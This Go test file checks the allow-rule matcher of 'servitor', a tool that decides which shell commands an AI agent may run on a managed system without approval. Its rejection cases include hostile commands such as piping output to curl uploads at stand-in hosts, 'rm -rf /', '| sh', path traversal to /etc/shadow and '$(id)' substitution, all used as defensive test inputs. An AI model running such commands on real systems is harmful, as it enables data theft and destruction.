package servitor

import (
	"os"
	"strings"
	"testing"

	. "github.com/cmcoffee/gohort/core"
	"github.com/cmcoffee/gohort/core/jsonapi"
	"github.com/cmcoffee/snugforge/kvlite"
)

// Always saves a rule worked out from the command: what varies from one run
// to the next becomes a placeholder, the program and its flags stay as
// written. Saving the exact command meant one naming a file or a date never
// came round again.
func TestAlwaysSuggestsARuleFromTheCommand(t *testing.T) {
	for cmd, want := range map[string]string{
		"tail -n 200 /var/log/app/2026-10-22.log":                        "tail -n <number> /var/log/app/*.log",
		`grep -i "timeout" /opt/app/logs/worker-3.log`:                   "grep -i <text> /opt/app/logs/*.log",
		"systemctl status nginx":                                         "systemctl status nginx",
		"cat /tmp/servitor-0f8fad5b-d9cb-469f-a165-70867728950e/out.txt": "cat /tmp/servitor-*/*.txt",
		"journalctl --since=2026-10-22 -u app":                           "journalctl --since=* -u app",
		"grep error app.log | head -n 5":                                 "grep error app.log | head -n <number>",
		"echo $(id)":                                                     "echo $(id)",
		"grep -c x f.log > /tmp/count.txt":                               "grep -c x f.log > /tmp/count.txt",
	} {
		if got := suggestAllowRule(cmd); got != want {
			t.Errorf("suggestAllowRule(%q) = %q, want %q", cmd, got, want)
		}
	}
}

// A rule allows only what it says: the same number of words, the program and
// any redirect target as written, a placeholder only for a plain word, never
// a word that runs something, leaves its folder, or is a path where the rule
// said text.
func TestARuleAllowsOnlyWhatItSays(t *testing.T) {
	rule := "tail -n <number> /var/log/app/*.log"
	for cmd, want := range map[string]bool{
		"tail -n 50 /var/log/app/other.log":           true,
		"tail -n 50 /var/log/app/sub/x.log":           false, // a * stays in its folder
		"tail -n 50 /var/log/app/../../etc/x.log":     false,
		"tail -n 50 /var/log/app/x.log; rm -rf /":     false, // more words, and an operator
		"tail -n $(id) /var/log/app/x.log":            false, // a word that runs something
		"tail -n abc /var/log/app/x.log":              false,
		"head -n 50 /var/log/app/x.log":               false, // the program is as written
		"tail -n 50 /var/log/app/x.txt":               false,
		"tail -n 50 /var/log/app/{x.log,/etc/shadow}": false,
	} {
		if got := matchAllowRule(rule, cmd); got != want {
			t.Errorf("rule %q on %q = %v, want %v", rule, cmd, got, want)
		}
	}
	if matchAllowRule("rm <text>", "rm /etc/passwd") {
		t.Error("<text> must not stand for a path")
	}
	if !matchAllowRule("rm <text>", "rm scratch.tmp") {
		t.Error("<text> stands for a plain word")
	}
	if matchAllowRule("<text> status nginx", "reboot status nginx") {
		t.Error("the program word is always as written")
	}
	if matchAllowRule("grep a b > /tmp/*.out", "grep a b > /tmp/x.out") {
		t.Error("a redirect's target is always as written")
	}
	if !matchAllowRule("cat a; cat b", "cat a; cat b") {
		t.Error("an exact command, operators and all, is still allowed as written")
	}
	if err := validAllowRule("tail -n <number> /var/log/*", "tail -n 200 /var/log/app/x.log"); err == nil {
		t.Error("a rule that no longer covers its command must be refused")
	}
	if err := validAllowRule(rule, "tail -n 200 /var/log/app/2026-10-22.log"); err != nil {
		t.Errorf("the suggested rule covers its command: %v", err)
	}
}

// Approval finds an Always answer saved for the exact command or a rule that
// matches it, on that system only.
func TestApprovalFindsAMatchingRule(t *testing.T) {
	saved := map[string]bool{alwaysAllowKey("sys1", "tail -n <number> /var/log/app/*.log"): true}
	keys := []string{alwaysAllowKey("sys1", "tail -n <number> /var/log/app/*.log")}
	get := func(k string) bool { return saved[k] }
	if !allowedByRule(get, keys, "sys1", "tail -n 20 /var/log/app/a.log") {
		t.Error("a command a rule matches is allowed")
	}
	if allowedByRule(get, keys, "sys2", "tail -n 20 /var/log/app/a.log") {
		t.Error("a rule is for its own system")
	}
	if allowedByRule(get, keys, "sys1", "tail -n 20 /etc/a.log") {
		t.Error("a command no rule matches still asks")
	}
}

// A rule edited in Permissions has no command to be held to, so it keeps the
// saved rule's shape: its words may narrow or widen, but not its program, its
// operators, a redirect's target, or how many words it has.
func TestAnEditedRuleKeepsItsShape(t *testing.T) {
	old := "tail -n <number> /var/log/app/*.log"
	for _, ok := range []string{"tail -n <number> /var/log/*/*.log", "tail -n 50 /var/log/app/a.log", "tail -f <number> /var/log/app/*"} {
		if err := validEditedRule(old, ok); err != nil {
			t.Errorf("%q is an edit of the words: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"rm -n <number> /var/log/app/*.log",        // another program
		"tail -n <number> /var/log/app/*.log /etc", // another word
		"tail -n <number>",                         // fewer words
		"tail -n <number> /var/log/app/*.log; rm",  // an operator added
	} {
		if err := validEditedRule(old, bad); err == nil {
			t.Errorf("%q must be refused as an edit", bad)
		}
	}
	if err := validEditedRule("grep x a > /tmp/out.txt", "grep x a > /tmp/*.txt"); err == nil {
		t.Error("a redirect's target stays as written")
	}
	if err := validEditedRule("cat a | grep b", "cat a ; grep b"); err == nil {
		t.Error("an operator stays as written")
	}
}

// The card's answer is checked against the command the card is about, and
// only while that command is waiting.
func TestACardsRuleIsCheckedAgainstItsCommand(t *testing.T) {
	cmd := "tail -n 200 /var/log/app/a.log"
	pendingCmds.Store("rule-card-sess", cmd)
	t.Cleanup(func() { pendingCmds.Delete("rule-card-sess") })
	id := confirmCardID("rule-card-sess", cmd, "n1")
	got, ok := pendingCommand(id)
	if !ok || got != cmd {
		t.Fatalf("the waiting command is found from its card: %q %v", got, ok)
	}
	if err := validAllowRule("tail -n <number> /var/log/app/*.log", got); err != nil {
		t.Errorf("a rule covering it is accepted: %v", err)
	}
	if err := validAllowRule("* -n <number> /var/log/app/*.log", got); err == nil {
		t.Error("a rule with its program wildcarded is refused")
	}
	if _, ok := pendingCommand(confirmCardID("rule-card-sess", "uptime", "n2")); ok {
		t.Error("a card for another command finds nothing")
	}
}

// A suggested rule always covers the command it was made from, whatever the
// command's shape. Always on an unedited card answered "that rule does not
// cover the command it was made from" for a $(...) with a space in it, a
// double-quoted $ string, a line continued with a backslash, and a folder
// with [ ] in its name: each was written back so it no longer read as the
// same word.
func TestASuggestedRuleCoversItsOwnCommand(t *testing.T) {
	cmds := []string{
		`tail -n 200 /var/log/app/2026-10-22.log`,
		`echo $(date +%F)`,
		`ls -la $(pwd)`,
		`grep "$USER is here" /etc/passwd`,
		`grep "$HOME/x" file`,
		"curl -s \\\n  http://example.test/api",
		`ls /data/[2024]/x.log`,
		`find /var/log -name "*.log" -mtime +7`,
		`journalctl -u nginx --since "2026-11-10 09:00" --no-pager`,
		`ps aux | grep -v grep | grep nginx`,
		`df -h && free -m`,
		`cat /etc/os-release 2>/dev/null || cat /etc/redhat-release`,
		`awk -F: '{print $1}' /etc/passwd`,
		`sed -n '1,20p' /etc/nginx/nginx.conf`,
		`for f in /var/log/*.log; do wc -l "$f"; done`,
		`systemctl status nginx --no-pager -l`,
		`docker ps --format '{{.Names}} {{.Status}}'`,
		`kubectl get pods -n kube-system -o wide`,
		`ss -tlnp | head -50`,
		`sudo -n true 2>&1 && echo ok`,
		`stat -c '%U %G %a' /etc/shadow`,
		`ls -la ~/.ssh`,
		`du -sh /var/* 2>/dev/null | sort -h | tail -20`,
		`echo "a b" > /tmp/out.txt`,
		`test -f /etc/hosts && echo yes`,
		`printf '%s\n' "$PATH"`,
		`cat <<'EOF'` + "\nhello\nEOF",
		`grep -rn "TODO" --include=*.go .`,
		`openssl x509 -in /etc/ssl/certs/ca.pem -noout -dates`,
		`ip -4 addr show eth0`,
		`netstat -an | grep :443`,
		`cut -d' ' -f1 /var/log/nginx/access.log | sort | uniq -c | sort -rn | head`,
		`export FOO=bar; env | grep FOO`,
		`[ -d /opt/app ] && ls /opt/app`,
		`uptime; who`,
		`mysql -e "SELECT 1"`,
		`curl -sS -o /dev/null -w '%{http_code}' https://example.test/health`,
		`ls -1 /var/lib/docker/containers/abc123def4567890/`,
		`echo ${HOME}`,
		`ls "$(dirname /etc/hosts)"`,
		`time ls`,
	}
	for _, c := range cmds {
		r := suggestAllowRule(c)
		if !matchAllowRule(r, c) {
			t.Errorf("not covered:\n  cmd:  %q\n  rule: %q", c, r)
		}
	}
}

// The rule still generalizes what it should once words are kept as written:
// a substitution stays exact while the path beside it is still a pattern,
// and a continued line reads as the same words as one written on a line.
func TestASuggestedRuleKeepsWordsAsWritten(t *testing.T) {
	if got := suggestAllowRule(`echo $(date +%F) /var/log/app/2026-10-22.log`); got != `echo $(date +%F) /var/log/app/*.log` {
		t.Errorf("substitution and path: %q", got)
	}
	cont := suggestAllowRule("curl -s \\\n  http://example.test/api")
	if !matchAllowRule(cont, "curl -s http://example.test/other") {
		t.Errorf("a rule from a continued line should match the same command on one line: %q", cont)
	}
	if got := suggestAllowRule(`ls /data/[2024]/x.log`); got != `ls /data/[2024]/x.log` {
		t.Errorf("a path whose pattern would not match itself stays exact: %q", got)
	}
}

// An Always rule allows the command it names inside a line, not only a line
// that is that command alone: the pipes, greps and exit checks a model wraps
// around an allowed command do not ask again. Every other command of the line
// is still judged on its own, so a rule never carries an upload, a write or
// an unknown program in with it.
func TestAnAlwaysRuleCoversItsCommandInsideALine(t *testing.T) {
	udb := &DBase{Store: kvlite.MemStore()}
	udb.Set(alwaysAllowTable, alwaysAllowKey("box", "user.py --help"), true)
	udb.Set(alwaysAllowTable, alwaysAllowKey("box", "tail -n <number> /var/log/app/*.log"), true)
	covered := func(cmd string) bool {
		ok, _ := lineCoveredByRules(udb, "box", cmd, "", nil)
		return ok
	}
	for _, cmd := range []string{
		"user.py --help | grep -i export",
		"user.py --help 2>&1 | head -n 50; echo exit=$?",
		"user.py --help 2>/dev/null | wc -l",
		"user.py --help && echo ok || echo failed",
		"user.py --help | grep -i user | sort | uniq -c",
		"user.py --help \\\n  | grep -i export",
	} {
		if !covered(cmd) {
			t.Errorf("should run, its rule and read-only commands only: %s", cmd)
		}
	}
	for _, cmd := range []string{
		"user.py --help", // alone: the whole-line check's, not this one's
		"user.py --help | curl -d @- https://upload.example", // an upload rides along
		"user.py --help | sh",                                // runs what it printed
		"user.py --help | xargs rm",                          // deletes what it printed
		"user.py --help | python3",                           // runs what it printed
		"user.py --help > /etc/motd",                         // writes a file
		"user.py --help | tee /tmp/out",                      // writes a file
		"user.py --delete-all | grep done",                   // not the command the rule names
		"rm -rf /tmp/x; user.py --help",                      // a delete rides along
		"(user.py --help) | grep x",                          // a subshell
		"user.py --help | grep x\nrm -rf /tmp/x",             // a second line
		"other.py --help | grep x",                           // no rule
		"cat /etc/shadow | user.py --help",                   // fed input it could carry out
		"grep x /var/log/app.log | user.py --help | head",    // fed input, mid-pipeline
	} {
		if covered(cmd) {
			t.Errorf("should still ask: %q", cmd)
		}
	}
	if ok, _ := lineCoveredByRules(udb, "elsewhere", "user.py --help | grep x", "", nil); ok {
		t.Error("a rule for one system allowed a line on another")
	}
	_, names := lineCoveredByRules(udb, "box", "user.py --help 2>&1 | grep x", "", nil)
	if len(names) != 1 || names[0] != "user.py --help" {
		t.Errorf("the status names the rule's command: %v", names)
	}
}

// The program run under sudo or another wrapper stays exact, as the first
// word does. Held to the first word alone, Always on "sudo /opt/tool.py
// --help" suggested "sudo /opt/*.py --help": any script in /opt, as root. A
// rule saved that wide before stops matching anything but itself.
func TestTheProgramUnderAWrapperStaysExact(t *testing.T) {
	for cmd, want := range map[string]string{
		"sudo /opt/tool.py --help":                "sudo /opt/tool.py --help",
		"sudo -u root /opt/tool.py --check":       "sudo -u root /opt/tool.py --check",
		"timeout 30 /opt/tool.py --x":             "timeout 30 /opt/tool.py --x",
		"sudo nice -n 5 /opt/tool.py -v":          "sudo nice -n 5 /opt/tool.py -v",
		"FOO=1 /opt/tool.py --x":                  "FOO=1 /opt/tool.py --x",
		"/usr/bin/sudo /opt/tool.py --help":       "/usr/bin/sudo /opt/tool.py --help",
		"sudo tail -n 200 /var/log/app/today.log": "sudo tail -n <number> /var/log/app/*.log",
	} {
		if got := suggestAllowRule(cmd); got != want {
			t.Errorf("%q suggested %q, want %q", cmd, got, want)
		}
	}
	for rule, cmd := range map[string]string{
		"sudo /opt/*.py --help":    "sudo /opt/evil.py --help",
		"sudo <text> --help":       "sudo rm --help",
		"sudo -u root /opt/*.py":   "sudo -u root /opt/evil.py",
		"sudo nice -n 5 <text> -v": "sudo nice -n 5 rm -v",
	} {
		if matchAllowRule(rule, cmd) {
			t.Errorf("%q let through %q", rule, cmd)
		}
	}
}

// <flags>, as a rule's last word, stands for anything after the program:
// flags and arguments alike, none included, as one command. Never an
// operator, a word that runs something, one leaving its folder, or another
// program. "Any flags" was read as exactly that, and "--go status" refused
// for its "status" was the rule not meaning what was added.
func TestFlagsStandForAnythingAfterTheProgram(t *testing.T) {
	rule := "sudo /opt/tool.py <flags>"
	for _, cmd := range []string{
		"sudo /opt/tool.py",
		"sudo /opt/tool.py --check",
		"sudo /opt/tool.py --check -v --level=3",
		"sudo /opt/tool.py --file=/var/tmp/x.json",
		"sudo /opt/tool.py report",
		"sudo /opt/tool.py --go status",
		"sudo /opt/tool.py --check /etc/hosts",
	} {
		if !matchAllowRule(rule, cmd) {
			t.Errorf("%q does not cover %q", rule, cmd)
		}
	}
	for _, cmd := range []string{
		"sudo /opt/other.py --check",
		"sudo /opt/tool.py --check | sh",
		"sudo /opt/tool.py --check > /etc/cron.d/x",
		"sudo /opt/tool.py --x=$(id)",
		"sudo /opt/tool.py --path=../../etc/shadow",
		"sudo /opt/tool.py --check; rm -rf /",
		"sudo /opt/tool.py --check ../../etc/shadow",
	} {
		if matchAllowRule(rule, cmd) {
			t.Errorf("%q let through %q", rule, cmd)
		}
	}
	// A rule run with plain sudo covers the command run without it: the same
	// thing with less privilege. One with sudo options of its own does not.
	if !matchAllowRule(rule, "/opt/tool.py --check") || matchAllowRule("sudo -u svc /opt/tool.py <flags>", "/opt/tool.py --check") {
		t.Error("a sudo rule and the command run without sudo")
	}
	// Without a wrapper too, and <args> is the same thing.
	if !matchAllowRule("/opt/tool.py <flags>", "/opt/tool.py report -v") || !matchAllowRule("/opt/tool.py <args>", "/opt/tool.py --go status") ||
		matchAllowRule("/opt/tool.py <args>", "/opt/tool.py --go status | sh") {
		t.Error("anything after a bare program")
	}
}

// A rule typed into Permissions has no command to hold it to: it is one
// command, the program (and the one under a wrapper) written out, no $ or
// backtick, and <flags> only last. An edit keeps <flags> last too.
func TestARuleAddedByHandIsHeldToItsProgram(t *testing.T) {
	for _, ok := range []string{"sudo /opt/tool.py <flags>", "systemctl status <text>", "sudo -u svc /opt/tool.py --check"} {
		if err := validNewRule(ok); err != nil {
			t.Errorf("%q refused: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"sudo <text>", "sudo /opt/*.py <flags>", "<text> --help",
		"ls | sh", "/opt/tool.py <flags> --x", "echo $(id)", "nice -n 5 <text>",
		// The flags would be sudo's own: -s, -i, a root shell.
		"sudo -u root <flags>", "sudo <flags>", "timeout 30 <flags>", "sudo nice -n 5 <flags>",
	} {
		if err := validNewRule(bad); err == nil {
			t.Errorf("%q was accepted", bad)
		}
	}
	if err := validEditedRule("tool.py --check -v", "tool.py <flags> -v"); err == nil {
		t.Error("an edit put <flags> before the last word")
	}
	if err := validEditedRule("sudo /opt/tool.py --check", "sudo /opt/tool.py <flags>"); err != nil {
		t.Errorf("an edit to <flags> at the end: %v", err)
	}
	if err := validEditedRule("sudo -u root -l", "sudo -u root <flags>"); err == nil {
		t.Error("an edit gave sudo's own options to <flags>")
	}
	if err := validAllowRule("sudo -u root <flags>", "sudo -u root -l"); err == nil {
		t.Error("Always on a card gave sudo's own options to <flags>")
	}
	for _, ok := range []string{"sudo -u svc /opt/tool.py <flags>", "sudo nice -n 5 /opt/tool.py <flags>", "timeout 30 /opt/tool.py <flags>", "/opt/tool.py <flags>"} {
		if err := validNewRule(ok); err != nil {
			t.Errorf("%q refused: %v", ok, err)
		}
	}
}

// Add in Permissions saves the rule for a system the user can reach, where
// an Always would; a bad rule, or a system they cannot reach, is refused.
func TestAddingARuleInPermissions(t *testing.T) {
	T := &Servitor{}
	T.DB = &DBase{Store: kvlite.MemStore()}
	udb := &DBase{Store: kvlite.MemStore()}
	udb.Set(applianceTable, "box-1", Appliance{ID: "box-1", Name: "web-01"})
	call := &jsonapi.Call{User: "alice", UDB: udb}
	if _, err := T.handleAlwaysAllowedSave(call, alwaysAllowedReq{ApplianceID: "box-1", Rule: "sudo /opt/tool.py <flags>", Add: true}); err != nil {
		t.Fatalf("adding: %v", err)
	}
	if !commandAlwaysAllowed(udb, "box-1", "sudo /opt/tool.py --check") || commandAlwaysAllowed(udb, "box-2", "sudo /opt/tool.py --check") {
		t.Error("the added rule is not the system's, and only the system's")
	}
	if _, err := T.handleAlwaysAllowedSave(call, alwaysAllowedReq{ApplianceID: "box-1", Rule: "sudo <text>", Add: true}); err == nil {
		t.Error("a rule naming no program was added")
	}
	if _, err := T.handleAlwaysAllowedSave(call, alwaysAllowedReq{ApplianceID: "not-mine", Rule: "ls", Add: true}); err == nil {
		t.Error("a rule was added for a system the user cannot reach")
	}
}

// sudo's -n (fail rather than ask for a password) changes nothing about what
// runs or as whom, so it is set aside on both sides: a rule without it covers
// a command with it, and the other way round. Options that do change it stay.
func TestSudoNonInteractiveIsHarmless(t *testing.T) {
	for rule, cmd := range map[string]string{
		"sudo /opt/tool.py <flags>":    "sudo -n /opt/tool.py --check",
		"sudo -n /opt/tool.py <flags>": "sudo /opt/tool.py --check",
		"sudo /opt/tool.py --check":    "sudo --non-interactive /opt/tool.py --check",
		"sudo -u svc /opt/tool.py":     "sudo -n -u svc /opt/tool.py",
	} {
		if !matchAllowRule(rule, cmd) {
			t.Errorf("%q does not cover %q", rule, cmd)
		}
	}
	for _, c := range [][2]string{
		{"sudo /opt/tool.py <flags>", "sudo -E /opt/tool.py --check"},
		{"sudo /opt/tool.py", "sudo -n -u root /opt/tool.py"},
		{"sudo /opt/tool.py <flags>", "sudo -nE /opt/tool.py"},
	} {
		if matchAllowRule(c[0], c[1]) {
			t.Errorf("%q let through %q", c[0], c[1])
		}
	}
}

// The investigator is told what runs without asking on the system: its
// Always rules and the kinds of command allowed, so it writes a command in an
// allowed shape. Told nothing, it guessed one ("sudo python3 ...") that was
// refused, and reported Servitor as locked down.
func TestTheInvestigatorIsToldWhatRunsWithoutAsking(t *testing.T) {
	udb := &DBase{Store: kvlite.MemStore()}
	if got := allowedCommandsBlock(udb, "", "box-1"); got != "" {
		t.Errorf("with nothing allowed: %q", got)
	}
	udb.Set(alwaysAllowTable, alwaysAllowKey("box-1", "sudo /opt/tool.py <flags>"), true)
	udb.Set(alwaysAllowTable, alwaysAllowKey("box-2", "rm -rf /srv/cache"), true)
	saveAllowedCategories(udb, map[string]bool{string(RiskSysControl): true})
	got := allowedCommandsBlock(udb, "", "box-1")
	for _, want := range []string{"Commands that run without asking here", "- `/opt/tool.py`, with anything after it (with or without sudo)", "no interpreter, no cd", "system control"} {
		if !strings.Contains(got, want) {
			t.Errorf("the block lacks %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "rm -rf /srv/cache") {
		t.Error("another system's rule is in this one's block")
	}
	src, _ := os.ReadFile("probe_session.go")
	if n := strings.Count(string(src), "+ allowedCommandsBlock(pr.udb, ActingAgent(pr.ctx), pr.appliance.ID)"); n != 3 {
		t.Errorf("the block reaches %d of the 3 prompts that write commands (two worker prompts, the investigator)", n)
	}
}

// A refused command that names the program of a rule for the system missed
// that rule's shape: the refusal names the rule and says to run it in that
// shape, rather than telling the agent not to retry. One naming no rule's
// program is refused as before.
func TestARefusalNamesTheRuleItMissed(t *testing.T) {
	udb := &DBase{Store: kvlite.MemStore()}
	udb.Set(alwaysAllowTable, alwaysAllowKey("box-1", "sudo /opt/tool.py <flags>"), true)
	for _, cmd := range []string{"sudo python3 /opt/tool.py --check", "cd /opt && sudo /opt/tool.py --check", "sudo /opt/tool.py report"} {
		if got := nearMissRule(udb, "box-1", cmd); got != "sudo /opt/tool.py <flags>" {
			t.Errorf("%q: near miss %q", cmd, got)
		}
	}
	if got := nearMissRule(udb, "box-1", "systemctl restart web"); got != "" {
		t.Errorf("an unrelated command: near miss %q", got)
	}
	if got := nearMissRule(udb, "box-2", "sudo python3 /opt/tool.py"); got != "" {
		t.Errorf("another system's rule: %q", got)
	}
	msg := agentRefusal{Cmd: "sudo python3 /opt/tool.py --check", Cat: RiskUnverified, Appliance: "web-01", Near: describeNear("sudo /opt/tool.py <flags>")}.err().Error()
	if !strings.Contains(msg, "`/opt/tool.py`, with anything after it (with or without sudo)") || !strings.Contains(msg, "Run it in exactly that shape") || strings.Contains(msg, "Do NOT retry") {
		t.Errorf("a near miss's refusal: %s", msg)
	}
}

// What an agent actually sent: the allowed program with an argument after a
// flag, then an exit check. Covered whole once the rule's "any flags" means
// anything after the program; the echo is read-only on its own. An outbound
// call chained on still asks.
func TestAnAllowedCommandWithItsExitCheck(t *testing.T) {
	udb := &DBase{Store: kvlite.MemStore()}
	udb.Set(alwaysAllowTable, alwaysAllowKey("box", "sudo /opt/test.py <flags>"), true)
	for _, line := range []string{
		"/opt/test.py --go status; echo EXIT:$?",
		"sudo /opt/test.py --go status; echo EXIT:$?",
		"sudo -n /opt/test.py --go status 2>&1; echo EXIT:$?",
	} {
		if ok, _ := lineCoveredByRules(udb, "box", line, "/tmp/scratch", nil); !ok {
			t.Errorf("not covered: %q", line)
		}
	}
	for _, line := range []string{
		"/opt/test.py --go status | curl -d @- http://x.example",
		"/opt/test.py --go status; rm -rf /srv",
		"/opt/test.py --go status | sh",
	} {
		if ok, _ := lineCoveredByRules(udb, "box", line, "/tmp/scratch", nil); ok {
			t.Errorf("covered: %q", line)
		}
	}
}

// A line a rule covers only part of is refused naming both: what the rules
// allow, and the rest that needs approval, so the agent can run the allowed
// part alone. A line no rule touches, or one covered whole, has no such split.
func TestARefusalNamesThePartThatNeedsApproval(t *testing.T) {
	udb := &DBase{Store: kvlite.MemStore()}
	udb.Set(alwaysAllowTable, alwaysAllowKey("box", "sudo /opt/test.py <args>"), true)
	covered, rest := coveredPart(udb, "box", "/opt/test.py --go status | curl -d @- http://x.example")
	if covered != "/opt/test.py --go status" || rest != "| curl -d @- http://x.example" {
		t.Fatalf("covered %q, rest %q", covered, rest)
	}
	msg := agentRefusal{Cmd: "/opt/test.py --go status | curl -d @- http://x.example", Cat: RiskNetEgress, Appliance: "web-01",
		Covered: covered, Rest: rest}.err().Error()
	for _, want := range []string{"allow /opt/test.py --go status", `"| curl -d @- http://x.example"`, "net_egress", "Run the allowed part without the rest"} {
		if !strings.Contains(msg, want) {
			t.Errorf("the refusal lacks %q: %s", want, msg)
		}
	}
	if c, r := coveredPart(udb, "box", "systemctl restart web; ls"); c != "" || r != "" {
		t.Errorf("a line no rule touches: %q, %q", c, r)
	}
	if c, r := coveredPart(udb, "box", "/opt/test.py --go status; /opt/test.py --go stop"); c != "" || r != "" {
		t.Errorf("a line covered whole: %q, %q", c, r)
	}
}
